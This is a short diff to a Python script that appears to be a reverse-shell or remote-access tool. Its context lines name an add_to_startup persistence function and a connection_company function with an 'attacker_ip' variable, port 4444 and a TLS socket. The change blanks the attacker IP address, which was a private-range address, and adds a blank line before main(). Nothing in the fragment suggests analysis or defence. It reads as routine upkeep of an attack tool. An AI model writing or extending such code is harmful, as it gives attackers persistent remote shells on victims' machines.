@@ -74,7 +74,7 @@ def add_to_startup():
     
 #defining functions for shell connection
 def connection_company():
-    attacker_ip = '10.0.0.199'
+    attacker_ip = ''
     attacker_port = 4444
     context = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2)
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -167,4 +167,5 @@ def main():
             pass
 
 if __name__ == "__main__":
+
     main()
